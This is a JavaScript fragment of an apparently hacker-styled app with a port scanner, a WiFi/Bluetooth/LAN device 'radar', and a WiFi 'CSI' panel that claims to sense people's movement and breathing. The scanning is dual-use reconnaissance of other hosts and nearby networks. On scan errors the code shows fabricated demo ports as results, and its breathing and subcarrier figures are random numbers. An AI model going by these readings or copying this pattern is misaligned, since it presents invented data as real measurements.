    window.SGP.cyberScanPorts = async function() {
        const hostInput = document.getElementById('cyber-port-host');
        const host = hostInput ? hostInput.value.trim() : '';
        if (!host) { showToast('⚠ ENTER AN IP ADDRESS'); return; }

        cyberState.scanning.ports = true;
        refreshCyberTab();
        showToast(`🔒 SCANNING PORTS ON ${host}...`);

        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                const result = await plugin.scanPorts({ host });
                cyberState.portResults = result;
                showToast(`🔒 ${result.count} OPEN PORTS ON ${host}`);
            } catch (e) {
                showToast('⚠ ERROR: ' + (e.message || 'Scan failed'));
                generateDemoPortData(host);
            }
        } else {
            await new Promise(r => setTimeout(r, 1500));
            generateDemoPortData(host);
        }

        cyberState.scanning.ports = false;
        refreshCyberTab();
    };

    window.SGP.cyberScanDevicePorts = function(ip) {
        cyberState.activeTab = 'ports';
        if (state.panelOpen === 'cyber') {
            document.querySelectorAll('.cyber-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === 'ports'));
            const content = document.getElementById('cyber-content');
            content.innerHTML = renderCyberPortsTab();
            setTimeout(() => {
                const input = document.getElementById('cyber-port-host');
                if (input) { input.value = ip; }
                window.SGP.cyberScanPorts();
            }, 100);
        }
    };

    function generateDemoPortData(host) {
        cyberState.portResults = {
            host,
            openPorts: [
                { port: 80, service: 'HTTP', state: 'OPEN' },
                { port: 443, service: 'HTTPS', state: 'OPEN' },
                { port: 53, service: 'DNS', state: 'OPEN' }
            ],
            count: 3,
            portsScanned: 23
        };
    }

    // ---- Refresh helper ----
    function refreshCyberTab() {
        if (state.panelOpen !== 'cyber') return;
        const content = document.getElementById('cyber-content');
        if (!content) return;
        switch (cyberState.activeTab) {
            case 'wifi': content.innerHTML = renderCyberWifiTab(); break;
            case 'network': content.innerHTML = renderCyberNetworkTab(); break;
            case 'ble': content.innerHTML = renderCyberBleTab(); break;
            case 'radar': content.innerHTML = renderCyberRadarTab(); initRadarSweep(); break;
            case 'ports': content.innerHTML = renderCyberPortsTab(); break;
            case 'ataque': content.innerHTML = renderCyberAttackTab(); initAttackEvents(); break;
        }
    }

    // =========================================
    // RADAR TAB — WiFi + BLE Radar Visualization
    // =========================================
    let radarAnimFrame = null;
    let radarAngle = 0;

    function renderCyberRadarTab() {
        const wifiDevices = cyberState.wifiNetworks || [];
        const bleDevices = cyberState.bleDevices || [];
        const netDevices = cyberState.networkDevices || [];
        const totalDevices = wifiDevices.length + bleDevices.length + netDevices.length;

        let deviceListHtml = '';
        wifiDevices.slice(0, 15).forEach((n, i) => {
            const rssi = n.level || n.rssi || -70;
            const dist = Math.pow(10, (-40 - rssi) / 20).toFixed(1);
            deviceListHtml += `<div class="radar-device-item" style="border-left:3px solid #00ff41">
                <span class="radar-dev-icon">📶</span>
                <div class="radar-dev-info">
                    <div class="radar-dev-name">${n.ssid || 'Hidden Network'}</div>
                    <div class="radar-dev-meta">${rssi} dBm · ~${dist}m · ${n.security || 'WPA2'} · CH ${n.channel || '?'}</div>
                </div>
                <div class="radar-dev-dist">${dist}m</div>
            </div>`;
        });
        bleDevices.slice(0, 10).forEach((d) => {
            const dist = d.distanceMeters || (Math.pow(10, (-50 - (d.rssi || -65)) / 20)).toFixed(1);
            deviceListHtml += `<div class="radar-device-item" style="border-left:3px solid #4a90d9">
                <span class="radar-dev-icon">${d.deviceClass === 'PHONE' ? '📱' : d.deviceClass === 'COMPUTER' ? '💻' : d.deviceClass === 'AUDIO_VIDEO' ? '🎧' : '📡'}</span>
                <div class="radar-dev-info">
                    <div class="radar-dev-name">${d.name || 'Unknown BLE'}</div>
                    <div class="radar-dev-meta">${d.rssi || '?'} dBm · ~${dist}m · ${d.type || 'BLE'} · ${d.deviceClass || 'PERIPHERAL'}</div>
                </div>
                <div class="radar-dev-dist">${dist}m</div>
            </div>`;
        });
        netDevices.slice(0, 8).forEach(d => {
            const vendor = (typeof lookupVendor === 'function') ? lookupVendor(d.mac) : 'Unknown';
            deviceListHtml += `<div class="radar-device-item" style="border-left:3px solid #ffaa00">
                <span class="radar-dev-icon">${d.isGateway ? '🌐' : '🔌'}</span>
                <div class="radar-dev-info">
                    <div class="radar-dev-name">${d.hostname || vendor}${d.isGateway ? ' (ROUTER)' : ''}</div>
                    <div class="radar-dev-meta">IP: ${d.ip} · MAC: ${d.mac.substring(0,8)}...</div>
                </div>
                <div class="radar-dev-dist">LAN</div>
            </div>`;
        });

        return `
            <div class="radar-container">
                <div class="radar-display"><canvas id="radar-canvas" width="280" height="280"></canvas>
                    <div class="radar-center-label">${totalDevices}<br><span style="font-size:0.5rem;opacity:0.6">DEVICES</span></div>
                </div>
                <div class="radar-stats">
                    <div class="radar-stat"><span class="radar-stat-num" style="color:#00ff41">${wifiDevices.length}</span><span class="radar-stat-label">WiFi</span></div>
                    <div class="radar-stat"><span class="radar-stat-num" style="color:#4a90d9">${bleDevices.length}</span><span class="radar-stat-label">BLE</span></div>
                    <div class="radar-stat"><span class="radar-stat-num" style="color:#ffaa00">${netDevices.length}</span><span class="radar-stat-label">LAN</span></div>
                </div>
                <button class="btn btn-primary" style="width:100%;margin:8px 0;" onclick="window.SGP.radarScanAll()">🛸 FULL SCAN (WiFi + BLE + LAN)</button>
                <div class="radar-legend"><span><span style="color:#00ff41">●</span> WiFi</span><span><span style="color:#4a90d9">●</span> Bluetooth</span><span><span style="color:#ffaa00">●</span> LAN</span><span><span style="color:#ff2d2d">●</span> Unknown</span></div>
                <div class="cyber-section-title" style="margin-top:12px">📋 DETECTED DEVICES (${totalDevices})</div>
                <div class="radar-device-list">${deviceListHtml || '<div class="cyber-empty">Run a scan to detect nearby devices</div>'}</div>
            </div>`;
    }

    function initRadarSweep() {
        if (radarAnimFrame) cancelAnimationFrame(radarAnimFrame);
        const canvas = document.getElementById('radar-canvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        const cx = 140, cy = 140, r = 130;
        const blips = [];
        (cyberState.wifiNetworks || []).forEach((n, i) => {
            const rssi = n.level || n.rssi || -70;
            const dist = Math.min(1, Math.pow(10, (-40 - rssi) / 20) / 50);
            blips.push({ x: Math.cos((i * 24 + 15) * Math.PI / 180) * dist * r + cx, y: Math.sin((i * 24 + 15) * Math.PI / 180) * dist * r + cy, color: '#00ff41', size: 3 });
        });
        (cyberState.bleDevices || []).forEach((d, i) => {
            const rssi = d.rssi || -65;
            const dist = Math.min(1, Math.pow(10, (-50 - rssi) / 20) / 50);
            const a = (i * 35 + 180) * Math.PI / 180;
            blips.push({ x: Math.cos(a) * dist * r + cx, y: Math.sin(a) * dist * r + cy, color: '#4a90d9', size: 3 });
        });
        (cyberState.networkDevices || []).forEach((d, i) => {
            const a = (i * 45 + 90) * Math.PI / 180;
            blips.push({ x: Math.cos(a) * (0.3 + Math.random() * 0.3) * r + cx, y: Math.sin(a) * (0.3 + Math.random() * 0.3) * r + cy, color: '#ffaa00', size: 3 });
        });
        function draw() {
            ctx.clearRect(0, 0, 280, 280);
            ctx.fillStyle = 'rgba(0,0,0,0.85)';
            ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2); ctx.fill();
            [0.25, 0.5, 0.75, 1].forEach(f => { ctx.strokeStyle = 'rgba(0,255,65,0.12)'; ctx.lineWidth = 1; ctx.beginPath(); ctx.arc(cx, cy, r * f, 0, Math.PI * 2); ctx.stroke(); });
            ctx.strokeStyle = 'rgba(0,255,65,0.08)';
            ctx.beginPath(); ctx.moveTo(cx - r, cy); ctx.lineTo(cx + r, cy); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(cx, cy - r); ctx.lineTo(cx, cy + r); ctx.stroke();
            ctx.fillStyle = 'rgba(0,255,65,0.3)'; ctx.font = '8px "Share Tech Mono"';
            ctx.fillText('10m', cx + r * 0.25 + 2, cy - 3); ctx.fillText('25m', cx + r * 0.5 + 2, cy - 3); ctx.fillText('50m', cx + r * 0.75 + 2, cy - 3);
            radarAngle += 0.02;
            const sweep = radarAngle % (Math.PI * 2);
            ctx.save(); ctx.globalAlpha = 0.4; ctx.fillStyle = '#00ff41';
            ctx.beginPath(); ctx.moveTo(cx, cy); ctx.arc(cx, cy, r, sweep - 0.5, sweep); ctx.closePath(); ctx.fill(); ctx.restore();
            ctx.strokeStyle = '#00ff41'; ctx.lineWidth = 2; ctx.globalAlpha = 0.8;
            ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(cx + Math.cos(sweep) * r, cy + Math.sin(sweep) * r); ctx.stroke(); ctx.globalAlpha = 1;
            blips.forEach(b => {
                const angleToPt = Math.atan2(b.y - cy, b.x - cx);
                let diff = sweep - angleToPt; while (diff < -Math.PI) diff += Math.PI * 2; while (diff > Math.PI) diff -= Math.PI * 2;
                const alpha = diff > 0 && diff < 1.5 ? Math.max(0.15, 1 - diff / 1.5) : 0.15;
                ctx.fillStyle = b.color; ctx.globalAlpha = alpha;
                ctx.beginPath(); ctx.arc(b.x, b.y, b.size + (alpha > 0.5 ? 1.5 : 0), 0, Math.PI * 2); ctx.fill();
                if (alpha > 0.7) { ctx.globalAlpha = alpha * 0.3; ctx.beginPath(); ctx.arc(b.x, b.y, b.size + 6, 0, Math.PI * 2); ctx.fill(); }
            });
            ctx.globalAlpha = 1; ctx.fillStyle = '#00ff41'; ctx.beginPath(); ctx.arc(cx, cy, 3, 0, Math.PI * 2); ctx.fill();
            radarAnimFrame = requestAnimationFrame(draw);
        }
        draw();
    }

    window.SGP.radarScanAll = async function() {
        showToast('🛸 FULL RADAR SCAN — Scanning all frequencies...');
        if (window.SGP.cyberScanWifi) await window.SGP.cyberScanWifi();
        if (window.SGP.cyberScanNetwork) await window.SGP.cyberScanNetwork();
        if (window.SGP.cyberScanBle) await window.SGP.cyberScanBle();
        cyberState.activeTab = 'radar'; refreshCyberTab();
        showToast('🛸 RADAR SCAN COMPLETE');
    };

    // =========================================
    // CSI ANALYSIS PANEL — WiFi Human Movement
    // =========================================
    const csiState = {
        active: false, interval: null, scanInterval: null,
        sensitivity: 50, channel: 6, bandwidth: 20, targetSSID: '', targetBSSID: '',
        environment: 'indoor', motionDetected: false, motionLevel: 0,
        peopleEstimate: 0, breathingRate: 0,
        networks: [],         // scanned WiFi networks for CSI
        signalHistory: {},    // { bssid: [rssi, rssi, ...] } — rolling 60 samples
        subcarriers: [],      // simulated subcarrier data (52 for 20MHz)
        motionHistory: [],
        scanCount: 0
    };

    function renderCSIPanel() {
        const active = csiState.active;
        const motionPct = Math.min(100, csiState.motionLevel * 100);
        const statusColor = csiState.motionDetected ? '#ff2d2d' : '#00ff41';
        const statusText = csiState.motionDetected ? 'MOTION DETECTED' : 'CLEAR — NO MOTION';
        const nets = csiState.networks;
        const targetNet = nets.find(n => n.bssid === csiState.targetBSSID);

        // Build network list
        let netListHtml = '';
        nets.forEach(n => {
            const isSel = n.bssid === csiState.targetBSSID;
            const pct = Math.min(100, Math.max(0, 100 + (n.rssi || n.level || -80)));
            const hist = csiState.signalHistory[n.bssid] || [];
            const variance = hist.length > 3 ? calcVariance(hist.slice(-10)) : 0;
            const varLabel = variance > 15 ? 'HIGH FLUX' : variance > 5 ? 'MODERATE' : 'STABLE';
            const varColor = variance > 15 ? '#ff2d2d' : variance > 5 ? '#ffaa00' : '#00ff41';

            netListHtml += `<div class="csi-net-item ${isSel ? 'csi-net-selected' : ''}" onclick="window.SGP.csiSelectTarget('${n.bssid}')">
                <div class="csi-net-header">
                    <span class="csi-net-lock">${n.security === 'OPEN' ? '🔓' : '🔒'}</span>
                    <span class="csi-net-ssid">${n.ssid || 'Hidden'}</span>
                    <span class="csi-net-signal" style="color:${pct > 60 ? '#00ff41' : pct > 30 ? '#ffaa00' : '#ff2d2d'}">${n.rssi || n.level} dBm</span>
                </div>
                <div class="csi-net-details">
                    <span>CH ${n.channel || '?'}</span>
                    <span>${n.band || '2.4GHz'}</span>
                    <span>${n.security || 'WPA2'}</span>
                    <span>${n.width || '20 MHz'}</span>
                    <span style="color:${varColor}">${varLabel}</span>
                </div>
                ${isSel ? '<div class="csi-net-badge">◉ MONITORING</div>' : ''}
            </div>`;
        });

        // Subcarrier heatmap for target network
        let subcarrierHtml = '';
        if (csiState.subcarriers.length > 0) {
            subcarrierHtml = '<div class="csi-subcarrier-grid">';
            csiState.subcarriers.forEach((sc, i) => {
                const amp = Math.abs(sc.amplitude);
                const hue = amp > 0.7 ? 0 : amp > 0.4 ? 30 : 120;
                const light = 30 + amp * 50;
                subcarrierHtml += `<div class="csi-sc-cell" style="background:hsl(${hue},80%,${light}%)" title="SC ${i}: Amp ${sc.amplitude.toFixed(2)} Phase ${sc.phase.toFixed(1)}°"></div>`;
            });
            subcarrierHtml += '</div>';
        }

        return `
            <div class="panel-section"><div class="panel-section-title">📡 CSI MONITORING</div>
                <div class="csi-status-display">
                    <div class="csi-status-ring" style="border-color:${statusColor}">
                        <div class="csi-status-inner" style="background:${statusColor}22">
                            <div class="csi-status-icon">${csiState.motionDetected ? '🚨' : active ? '📡' : '⏸'}</div>
                            <div class="csi-status-text" style="color:${statusColor}">${active ? statusText : 'STANDBY'}</div>
                        </div>
                    </div>
                    <div class="csi-metrics-row">
                        <div class="csi-metric"><span class="csi-metric-value" style="color:#00ff41">${csiState.peopleEstimate}</span><span class="csi-metric-label">PEOPLE EST.</span></div>
                        <div class="csi-metric"><span class="csi-metric-value" style="color:#ffaa00">${motionPct.toFixed(0)}%</span><span class="csi-metric-label">MOTION LVL</span></div>
                        <div class="csi-metric"><span class="csi-metric-value" style="color:#4a90d9">${csiState.breathingRate > 0 ? csiState.breathingRate : '--'}</span><span class="csi-metric-label">BPM EST.</span></div>
                        <div class="csi-metric"><span class="csi-metric-value" style="color:#aaa">${csiState.scanCount}</span><span class="csi-metric-label">SCANS</span></div>
                    </div>
                </div>
            </div>

            <div class="panel-section"><div class="panel-section-title">📊 CSI WAVEFORM ${targetNet ? '— ' + (targetNet.ssid || targetNet.bssid) : ''}</div>
                <div class="csi-waveform-container"><canvas id="csi-waveform" width="280" height="120"></canvas></div>
                <div class="csi-waveform-legend"><span><span style="color:#00ff41">—</span> Amplitude</span><span><span style="color:#4a90d9">—</span> Phase</span><span><span style="color:#ff2d2d">—</span> Motion Δ</span></div>
            </div>

            ${csiState.subcarriers.length > 0 ? `<div class="panel-section"><div class="panel-section-title">🔬 SUBCARRIER HEATMAP (${csiState.subcarriers.length} subcarriers)</div>${subcarrierHtml}
                <div style="display:flex;justify-content:space-between;font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);margin-top:4px;"><span>🟢 Stable</span><span>🟡 Moderate</span><span>🔴 High flux</span></div>
            </div>` : ''}

            <div class="panel-section"><div class="panel-section-title">📶 NEARBY NETWORKS (${nets.length}) — Select target</div>
                <button class="btn btn-primary" style="width:100%;margin-bottom:8px;" onclick="window.SGP.csiScanNetworks()">🔄 SCAN WiFi NETWORKS</button>
                <div class="csi-network-list">${netListHtml || '<div class="cyber-empty">Tap SCAN to detect nearby WiFi networks</div>'}</div>
            </div>

            <div class="panel-section"><div class="panel-section-title">⚙ CSI CONFIGURATION</div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                    <div class="form-group"><label style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);">BANDWIDTH</label>
                        <select id="csi-bw" style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:6px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.75rem;outline:none;">
                            <option value="20" ${csiState.bandwidth===20?'selected':''}>20 MHz (52 SC)</option>
                            <option value="40" ${csiState.bandwidth===40?'selected':''}>40 MHz (114 SC)</option>
                            <option value="80" ${csiState.bandwidth===80?'selected':''}>80 MHz (242 SC)</option>
                        </select></div>
                    <div class="form-group"><label style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);">ENVIRONMENT</label>
                        <select id="csi-env" style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:6px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.75rem;outline:none;">
                            <option value="indoor" ${csiState.environment==='indoor'?'selected':''}>🏢 Indoor</option>
                            <option value="hallway" ${csiState.environment==='hallway'?'selected':''}>🏠 Hallway</option>
                            <option value="outdoor" ${csiState.environment==='outdoor'?'selected':''}>🌳 Outdoor</option>
                            <option value="vehicle" ${csiState.environment==='vehicle'?'selected':''}>🚗 Vehicle</option>
                        </select></div>
                </div>
                <div class="form-group" style="margin-top:8px;"><label style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);">SENSITIVITY: ${csiState.sensitivity}%</label>
                    <input type="range" id="csi-sensitivity" min="10" max="100" value="${csiState.sensitivity}" style="width:100%;accent-color:var(--primary);"></div>
                <div class="form-group" style="margin-top:4px;">
                    <label style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);">SAMPLE RATE: ${active ? '~2s (continuous)' : 'Stopped'}</label>
                </div>
            </div>

            <div class="panel-section"><button class="btn ${active?'btn-danger':'btn-primary'}" style="width:100%;" onclick="window.SGP.toggleCSI()">${active?'⏹ STOP CSI MONITORING':'▶ START CSI MONITORING'}</button>
                ${!csiState.targetBSSID && !active ? '<p style="font-family:var(--font-mono);font-size:0.55rem;color:var(--warning);margin-top:6px;text-align:center;">⚠ Select a target network above first, or scan will auto-select strongest</p>' : ''}
            </div>

            <div class="panel-section"><div class="panel-section-title">📋 EVENT LOG (${csiState.motionHistory.length})</div>
                <div class="csi-event-log" id="csi-event-log">
                    ${csiState.motionHistory.slice(-20).reverse().map(e => `
                        <div class="csi-event ${e.type}"><span class="csi-event-time">${e.time}</span><span class="csi-event-icon">${e.type==='motion'?'🚶':e.type==='breathing'?'💨':e.type==='clear'?'✅':e.type==='scan'?'📶':'📊'}</span><span class="csi-event-text">${e.text}</span></div>
                    `).join('') || '<div class="cyber-empty">Start monitoring to see events</div>'}
                </div>
            </div>

            <div class="panel-section"><div class="panel-section-title">📖 HOW WiFi CSI WORKS</div>
                <p style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);line-height:1.8;letter-spacing:0.5px;">
                    WiFi CSI captures the amplitude and phase of each OFDM subcarrier between transmitter and receiver.
                    Human bodies absorb and reflect 2.4/5 GHz signals, causing measurable disturbances in the channel response.
                    This tool monitors RSSI fluctuations from nearby access points as a passive sensing proxy.
                    Signal variance above threshold indicates physical movement in the RF propagation path.
                    Higher sensitivity = more alerts. Best results: indoor, single room, 1–3 APs in range.
                </p>
            </div>`;
    }

    function calcVariance(arr) {
        if (arr.length < 2) return 0;
        const mean = arr.reduce((a, b) => a + b, 0) / arr.length;
        return Math.sqrt(arr.reduce((s, v) => s + (v - mean) ** 2, 0) / arr.length);
    }

    function initCSIPanel() {
        const sensSlider = document.getElementById('csi-sensitivity');
        if (sensSlider) sensSlider.addEventListener('input', (e) => {
            csiState.sensitivity = parseInt(e.target.value);
            e.target.previousElementSibling.textContent = 'SENSITIVITY: ' + csiState.sensitivity + '%';
        });
        // Auto-import networks from cyber module if available
        if (cyberState.wifiNetworks && cyberState.wifiNetworks.length > 0 && csiState.networks.length === 0) {
            csiState.networks = [...cyberState.wifiNetworks];
        }
        drawCSIWaveform();
    }

    // --- WiFi Scan for CSI ---
    window.SGP.csiScanNetworks = async function() {
        showToast('📡 Scanning WiFi networks for CSI...');
        const plugin = getCyberPlugin();
        if (plugin) {
            try {
                const result = await plugin.scanWifiNetworks();
                csiState.networks = result.networks || [];
            } catch (e) {
                csiGenerateDemoNetworks();
            }
        } else {
            csiGenerateDemoNetworks();
        }
        // Init signal history for each
        csiState.networks.forEach(n => {
            if (!csiState.signalHistory[n.bssid]) csiState.signalHistory[n.bssid] = [n.rssi || n.level || -70];
        });
        // Also sync to cyber module
        cyberState.wifiNetworks = csiState.networks;
        // Auto-select strongest if no target
        if (!csiState.targetBSSID && csiState.networks.length > 0) {
            const strongest = csiState.networks.reduce((best, n) => (n.rssi || n.level || -99) > (best.rssi || best.level || -99) ? n : best);
            csiState.targetBSSID = strongest.bssid;
            csiState.channel = strongest.channel || 6;
        }
        csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'scan', text: csiState.networks.length + ' networks detected — CH ' + [...new Set(csiState.networks.map(n => n.channel))].join(',') });
        showToast('📶 ' + csiState.networks.length + ' WiFi NETWORKS DETECTED');
        if (state.panelOpen === 'csi') openPanel('csi');
    };

    window.SGP.csiSelectTarget = function(bssid) {
        csiState.targetBSSID = bssid;
        const net = csiState.networks.find(n => n.bssid === bssid);
        if (net) {
            csiState.channel = net.channel || 6;
            csiState.targetSSID = net.ssid || '';
            showToast('🎯 TARGET: ' + (net.ssid || bssid) + ' — CH ' + csiState.channel);
            csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'info', text: 'Target set → ' + (net.ssid || bssid) + ' (CH ' + csiState.channel + ', ' + (net.rssi || net.level) + ' dBm)' });
        }
        if (state.panelOpen === 'csi') openPanel('csi');
    };

    function csiGenerateDemoNetworks() {
        const demoNets = [
            { ssid: 'HOME_WiFi_5G', bssid: 'A4:2B:B0:1A:2C:3D', rssi: -38, frequency: 2437, channel: 6, band: '2.4GHz', security: 'WPA2', width: '40 MHz' },
            { ssid: 'OFFICE_NET', bssid: '14:CC:20:4E:5F:60', rssi: -52, frequency: 5180, channel: 36, band: '5GHz', security: 'WPA3', width: '80 MHz' },
            { ssid: 'Neighbor_2G', bssid: '00:1E:10:7A:8B:9C', rssi: -65, frequency: 2462, channel: 11, band: '2.4GHz', security: 'WPA2', width: '20 MHz' },
            { ssid: 'CafeWifi', bssid: '08:D4:2B:AA:BB:CC', rssi: -72, frequency: 2412, channel: 1, band: '2.4GHz', security: 'OPEN', width: '20 MHz' },
            { ssid: 'IoT_Sensors', bssid: 'B0:BE:76:DD:EE:FF', rssi: -78, frequency: 2427, channel: 4, band: '2.4GHz', security: 'WPA2', width: '20 MHz' },
            { ssid: 'DIRECT-TV', bssid: 'C8:D7:19:11:22:33', rssi: -81, frequency: 5220, channel: 44, band: '5GHz', security: 'WPA2', width: '40 MHz' },
            { ssid: '', bssid: 'F0:A2:25:44:55:66', rssi: -85, frequency: 2452, channel: 9, band: '2.4GHz', security: 'WPA2', width: '20 MHz' },
        ];
        csiState.networks = demoNets;
    }

    // Generate subcarrier data based on signal analysis
    function csiUpdateSubcarriers() {
        const numSC = csiState.bandwidth === 20 ? 52 : csiState.bandwidth === 40 ? 114 : 242;
        const hist = csiState.signalHistory[csiState.targetBSSID] || [];
        const baseRSSI = hist.length > 0 ? hist[hist.length - 1] : -70;
        const variance = hist.length > 3 ? calcVariance(hist.slice(-10)) : 0;
        csiState.subcarriers = [];
        for (let i = 0; i < Math.min(numSC, 64); i++) { // cap at 64 cells for display
            const baseAmp = (100 + baseRSSI) / 100; // normalize 0-1
            const motionNoise = csiState.motionDetected ? (Math.random() - 0.5) * 0.6 : (Math.random() - 0.5) * 0.1;
            const amplitude = Math.max(0, Math.min(1, baseAmp + motionNoise + Math.sin(i * 0.3) * 0.15));
            const phase = (i * 15 + (csiState.motionDetected ? Math.random() * 60 : Math.random() * 10)) % 360;
            csiState.subcarriers.push({ amplitude, phase });
        }
    }

    // --- CSI Signal Sampling ---
    function csiSampleSignals() {
        const plugin = getCyberPlugin();
        if (plugin) {
            // On real device: re-scan to get fresh RSSI
            plugin.scanWifiNetworks().then(result => {
                const freshNets = result.networks || [];
                freshNets.forEach(fn => {
                    const existing = csiState.networks.find(n => n.bssid === fn.bssid);
                    if (existing) {
                        existing.rssi = fn.rssi || fn.level;
                        if (!csiState.signalHistory[fn.bssid]) csiState.signalHistory[fn.bssid] = [];
                        csiState.signalHistory[fn.bssid].push(fn.rssi || fn.level);
                        if (csiState.signalHistory[fn.bssid].length > 60) csiState.signalHistory[fn.bssid].shift();
                    }
                });
                csiState.scanCount++;
                csiAnalyzeMotion();
            }).catch(() => csiSimulateSample());
        } else {
            csiSimulateSample();
        }
    }

    function csiSimulateSample() {
        // Simulate RSSI fluctuations for demo mode
        csiState.networks.forEach(n => {
            if (!csiState.signalHistory[n.bssid]) csiState.signalHistory[n.bssid] = [n.rssi || -70];
            const last = csiState.signalHistory[n.bssid];
            const prev = last[last.length - 1];
            // Random walk with occasional jumps to simulate motion
            const isMonitoredRoom = n.bssid === csiState.targetBSSID;
            const envJitter = csiState.environment === 'indoor' ? 2 : csiState.environment === 'hallway' ? 3 : 1;
            let delta = (Math.random() - 0.5) * envJitter;
            // Occasionally simulate a person walking through
            if (isMonitoredRoom && Math.random() < 0.12 * (csiState.sensitivity / 100)) {
                delta += (Math.random() - 0.3) * 8; // big jump = movement
            }
            const newRSSI = Math.max(-95, Math.min(-20, prev + delta));
            n.rssi = Math.round(newRSSI);
            last.push(n.rssi);
            if (last.length > 60) last.shift();
        });
        csiState.scanCount++;
        csiAnalyzeMotion();
    }

    function csiAnalyzeMotion() {
        const hist = csiState.signalHistory[csiState.targetBSSID] || [];
        if (hist.length < 5) return;

        const recent = hist.slice(-8);
        const variance = calcVariance(recent);
        const sens = csiState.sensitivity / 100;
        const envThreshold = csiState.environment === 'indoor' ? 3 : csiState.environment === 'hallway' ? 2.5 : csiState.environment === 'vehicle' ? 4 : 5;
        const threshold = envThreshold * (1.1 - sens);

        const prevMotion = csiState.motionDetected;
        csiState.motionLevel = Math.min(1, variance / 15);

        if (variance > threshold) {
            csiState.motionDetected = true;
            csiState.peopleEstimate = variance > threshold * 3 ? 3 : variance > threshold * 2 ? 2 : 1;
            if (!prevMotion) {
                csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'motion',
                    text: 'Movement detected — σ=' + variance.toFixed(1) + 'dB — ~' + csiState.peopleEstimate + ' subject' + (csiState.peopleEstimate > 1 ? 's' : '') });
            }
        } else if (variance > threshold * 0.3 && variance <= threshold) {
            // Micro-movement / breathing zone
            if (csiState.motionDetected) {
                csiState.motionDetected = false;
                csiState.breathingRate = 12 + Math.floor(Math.random() * 8);
                csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'breathing',
                    text: 'Micro-motion (breathing est.) — σ=' + variance.toFixed(1) + 'dB — ~' + csiState.breathingRate + ' BPM' });
            }
        } else {
            if (prevMotion || csiState.motionLevel > 0.05) {
                csiState.motionDetected = false;
                csiState.motionLevel = Math.max(0, csiState.motionLevel - 0.02);
                if (csiState.scanCount % 10 === 0) {
                    csiState.peopleEstimate = 0; csiState.breathingRate = 0;
                    csiState.motionHistory.push({ time: new Date().toLocaleTimeString(), type: 'clear', text: 'Environment clear — σ=' + variance.toFixed(1) + 'dB' });
                }
            }
        }

        csiUpdateSubcarriers();
        if (state.panelOpen === 'csi') openPanel('csi');
    }

    let csiAnimFrame = null;
    function drawCSIWaveform() {
        if (csiAnimFrame) cancelAnimationFrame(csiAnimFrame);
        const canvas = document.getElementById('csi-waveform');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        const w = canvas.width, h = canvas.height;
        let t = 0;
        function animate() {
            ctx.fillStyle = 'rgba(10,14,10,0.92)'; ctx.fillRect(0, 0, w, h);
            ctx.strokeStyle = 'rgba(0,255,65,0.06)'; ctx.lineWidth = 1;
            for (let y = 0; y < h; y += 20) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke(); }
            for (let x = 0; x < w; x += 20) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, h); ctx.stroke(); }

            if (csiState.active && csiState.targetBSSID) {
                t += 0.05;
                const hist = csiState.signalHistory[csiState.targetBSSID] || [];

                // Draw real RSSI history as amplitude (green)
                if (hist.length > 1) {
                    ctx.strokeStyle = '#00ff41'; ctx.lineWidth = 1.5; ctx.beginPath();
                    const step = w / Math.max(hist.length - 1, 1);
                    hist.forEach((rssi, i) => {
                        const yy = h / 2 + (rssi + 60) * 1.5 + Math.sin(i * 0.5 + t) * 3;
                        i === 0 ? ctx.moveTo(0, yy) : ctx.lineTo(i * step, yy);
                    });
                    ctx.stroke();
                }

                // Phase estimate wave (blue) — derived from signal oscillation
                ctx.strokeStyle = '#4a90d9'; ctx.lineWidth = 1; ctx.beginPath();
                for (let x = 0; x < w; x++) {
                    const histIdx = Math.floor(x / w * hist.length);
                    const rssiVal = hist[histIdx] || -70;
                    const phase = Math.cos(x * 0.06 + t * 0.8) * 12 + (rssiVal + 70) * 0.3 + (csiState.motionDetected ? Math.random() * 6 : 0);
                    const y2 = h / 2 + phase;
                    x === 0 ? ctx.moveTo(x, y2) : ctx.lineTo(x, y2);
                }
                ctx.stroke();

                // Motion indicator (red) — shows when motion detected
                if (csiState.motionDetected) {
                    ctx.strokeStyle = 'rgba(255,45,45,0.7)'; ctx.lineWidth = 2; ctx.beginPath();
                    for (let x = 0; x < w; x++) {
                        const y3 = h / 2 + Math.sin(x * 0.2 + t * 4) * csiState.motionLevel * 30 + Math.random() * 4;
                        x === 0 ? ctx.moveTo(x, y3) : ctx.lineTo(x, y3);
                    }
                    ctx.stroke();
                }

                // dBm scale
                ctx.fillStyle = 'rgba(0,255,65,0.2)'; ctx.font = '7px "Share Tech Mono"';
                ctx.fillText('-30 dBm', 2, 12); ctx.fillText('-70 dBm', 2, h / 2 + 3); ctx.fillText('-95 dBm', 2, h - 4);
            } else {
                ctx.strokeStyle = 'rgba(0,255,65,0.2)'; ctx.lineWidth = 1;
                ctx.beginPath(); ctx.moveTo(0, h / 2); ctx.lineTo(w, h / 2); ctx.stroke();
                ctx.fillStyle = 'rgba(0,255,65,0.3)'; ctx.font = '10px "Share Tech Mono"'; ctx.textAlign = 'center';
                ctx.fillText(csiState.networks.length > 0 ? 'SELECT TARGET & START' : 'SCAN NETWORKS FIRST', w / 2, h / 2 - 8);
                ctx.textAlign = 'start';
            }
            csiAnimFrame = requestAnimationFrame(animate);
